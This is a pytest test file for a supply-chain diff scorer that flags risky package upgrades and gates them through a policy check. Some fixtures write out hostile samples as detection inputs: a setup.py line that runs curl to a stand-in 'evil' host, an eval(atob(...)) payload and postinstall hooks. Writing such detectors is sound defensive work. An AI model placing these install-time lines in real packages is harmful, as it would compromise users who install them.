"""Tests for eedom.core.supply_chain_diff -- deterministic signal scoring.

DPS-12 domains:
  Determinism (INVARIANT): the same VersionDiff always scores the same signals.
  Integrity (SAFETY): scoring only reads the diff; verdict-eligible findings carry
    the deterministic signal, never an LLM result.
  Availability / fail-open (LIVENESS): an unavailable source still yields a finding.
"""

from __future__ import annotations

import pytest

from eedom.core.models import FindingCategory
from eedom.core.supply_chain_diff import (
    detect_upgrades,
    evaluate_gate,
    score_signals,
)
from eedom.core.supply_chain_models import FileChange, FileDelta, VersionDiff


def _vd(**kw) -> VersionDiff:
    base = dict(package="p", ecosystem="pypi", old_version="1.0", new_version="1.1")
    base.update(kw)
    return VersionDiff(**base)


def _ids(vd: VersionDiff) -> dict[str, str]:
    return {f.id: f.severity for f in score_signals(vd)}


class TestSignals:
    def test_npm_install_hook_is_critical(self) -> None:
        vd = _vd(ecosystem="npm", new_install_scripts=("postinstall: node x.js",))
        assert _ids(vd)["SC-INSTALL-HOOK"] == "critical"

    def test_setup_py_exec_is_critical(self) -> None:
        vd = _vd(
            files=(
                FileDelta(
                    path="pkg-1.1/setup.py",
                    change=FileChange.modified,
                    diff_excerpt="+import subprocess; subprocess.run(['curl','evil'])",
                ),
            )
        )
        assert _ids(vd)["SC-INSTALL-HOOK"] == "critical"

    def test_obfuscation_is_high(self) -> None:
        blob = "A" * 200
        vd = _vd(
            files=(
                FileDelta(path="x.py", change=FileChange.added, diff_excerpt=f"+payload='{blob}'"),
            )
        )
        assert _ids(vd)["SC-OBFUSCATION"] == "high"

    def test_eval_atob_obfuscation_is_high(self) -> None:
        vd = _vd(
            ecosystem="npm",
            files=(
                FileDelta(path="x.js", change=FileChange.added, diff_excerpt="+eval(atob('Zm9v'))"),
            ),
        )
        assert _ids(vd)["SC-OBFUSCATION"] == "high"

    def test_risky_import_is_high(self) -> None:
        vd = _vd(
            files=(
                FileDelta(
                    path="m.py",
                    change=FileChange.modified,
                    diff_excerpt="+import subprocess\n+subprocess.run('x')",
                ),
            )
        )
        assert _ids(vd)["SC-RISKY-IMPORT"] == "high"

    def test_maintainer_change_is_medium(self) -> None:
        vd = _vd(old_maintainer="alice", new_maintainer="mallory")
        assert _ids(vd)["SC-MAINTAINER-CHANGE"] == "medium"

    def test_clean_upgrade_is_info(self) -> None:
        vd = _vd(files=(FileDelta(path="x.py", change=FileChange.modified, diff_excerpt="+# doc"),))
        assert list(_ids(vd)) == ["SC-CLEAN"]

    def test_unavailable_source_is_info(self) -> None:  # Availability
        assert list(_ids(_vd(available=False, error="404"))) == ["SC-SOURCE-UNAVAILABLE"]

    def test_findings_are_supply_chain_category(self) -> None:
        vd = _vd(new_install_scripts=("postinstall: x",), ecosystem="npm")
        for f in score_signals(vd):
            assert f.category == FindingCategory.supply_chain.value
            assert f.metadata["threat_signal"] == f.id
            assert "version_diff" in f.metadata


class TestProperties:
    def test_scoring_is_deterministic(self) -> None:  # Determinism
        vd = _vd(
            ecosystem="npm",
            new_install_scripts=("postinstall: node x.js",),
            files=(
                FileDelta(path="x.js", change=FileChange.added, diff_excerpt="+eval(atob('a'))"),
            ),
        )
        a = [(f.id, f.severity, f.message) for f in score_signals(vd)]
        b = [(f.id, f.severity, f.message) for f in score_signals(vd)]
        assert a == b

    def test_removed_files_do_not_trigger_signals(self) -> None:
        # A capability appearing only in a *removed* file is not an introduction.
        vd = _vd(
            files=(
                FileDelta(
                    path="m.py", change=FileChange.removed, diff_excerpt="-import subprocess"
                ),
            )
        )
        assert list(_ids(vd)) == ["SC-CLEAN"]


class TestDetectUpgrades:
    def test_detects_npm_bump_from_fragment(self) -> None:
        diff = (
            "diff --git a/package.json b/package.json\n"
            "--- a/package.json\n+++ b/package.json\n"
            '@@ -1,3 +1,3 @@\n   "dependencies": {\n'
            '-    "left-pad": "1.3.0"\n+    "left-pad": "1.3.1"\n   }\n'
        )
        assert detect_upgrades(diff) == [
            (
                "npm",
                {
                    "action": "upgraded",
                    "package": "left-pad",
                    "old_version": "1.3.0",
                    "new_version": "1.3.1",
                },
            )
        ]

    def test_detects_requirements_bump(self) -> None:
        diff = (
            "diff --git a/requirements.txt b/requirements.txt\n"
            "--- a/requirements.txt\n+++ b/requirements.txt\n"
            "@@ -1 +1 @@\n-flask==2.0.0\n+flask==2.0.1\n"
        )
        eco, change = detect_upgrades(diff)[0]
        assert eco == "pypi" and change["package"] == "flask"
        assert change["old_version"] == "2.0.0" and change["new_version"] == "2.0.1"

    def test_ignores_non_dependency_files(self) -> None:
        diff = "diff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n@@ -1 +1 @@\n-a\n+b\n"
        assert detect_upgrades(diff) == []


class TestGate:
    def test_gate_denies_on_critical(self, monkeypatch) -> None:  # Integrity
        import os

        os.environ["EEDOM_DB_DSN"] = "postgresql://t:t@localhost/t"
        from eedom.core.config import EedomSettings

        captured = {}

        class FakeOpa:
            def __init__(self, *a, **k) -> None:
                pass

            def evaluate(self, findings, pkg, config):
                captured["config"] = config
                captured["findings"] = findings
                from eedom.core.models import DecisionVerdict, PolicyEvaluation

                return PolicyEvaluation(
                    decision=DecisionVerdict.reject,
                    triggered_rules=["x"],
                    policy_bundle_version="t",
                )

        monkeypatch.setattr("eedom.core.policy.OpaEvaluator", FakeOpa)
        vd = _vd(ecosystem="npm", new_install_scripts=("postinstall: x",))
        result = evaluate_gate(score_signals(vd), EedomSettings())
        assert str(result.decision) == "reject"
        # only the supply-chain rule is enabled for the focused evaluation
        assert captured["config"]["rules_enabled"]["supply_chain_diff"] is True
        assert captured["config"]["rules_enabled"]["package_age"] is False
        assert captured["findings"][0].category == FindingCategory.supply_chain


if __name__ == "__main__":  # pragma: no cover
    pytest.main([__file__, "-v"])
